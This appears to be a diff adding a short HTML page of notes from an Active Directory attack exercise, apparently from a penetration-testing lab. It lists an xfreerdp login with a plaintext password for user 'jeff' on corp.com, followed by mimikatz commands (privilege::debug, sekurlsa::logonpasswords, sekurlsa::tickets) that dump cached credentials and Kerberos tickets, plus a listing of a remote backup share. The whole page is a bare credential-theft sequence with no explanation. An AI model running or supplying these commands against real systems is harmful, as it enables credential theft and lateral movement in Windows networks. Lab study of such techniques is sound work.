@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Cached AD Credentials</title>
+</head><body>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75<br/>
+<br/>
+cd C:\Tools<br/>
+<br/>
+.\mimikatz.exe<br/>
+<br/>
+privilege::debug<br/>
+<br/>
+sekurlsa::logonpasswords<br/>
+<br/>
+dir \\web04.corp.com\backup<br/>
+<br/>
+sekurlsa::tickets<br/>
+<br/>
+</body></html>
